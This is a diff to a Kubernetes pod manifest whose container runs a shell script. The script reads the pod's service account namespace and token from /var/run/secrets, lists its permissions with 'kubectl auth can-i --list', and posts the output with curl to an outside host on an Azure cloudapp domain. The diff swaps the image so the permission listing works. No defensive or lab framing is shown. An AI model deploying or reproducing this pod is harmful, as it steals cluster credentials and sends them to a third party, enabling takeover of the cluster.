@@ -5,15 +5,14 @@ metadata:
 spec:
   containers:
     - name: shell
-      image: alpine
+      image: bitnami/kubectl:latest
       command:
         - sh
         - -c
         - |
-          apk add curl;
           {
             echo '>> NAMESPACE:' && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace;
             echo '>> TOKEN:' && cat /var/run/secrets/kubernetes.io/serviceaccount/token;
-            echo '>> CAN-I:' && echo 'kubectl not found, alpine não tem kubectl';
+            echo '>> CAN-I:' && kubectl auth can-i --list 2>&1;
           } | curl -X POST --data-binary @- http://potter-maga.brazilsouth.cloudapp.azure.com:8080
   restartPolicy: Never
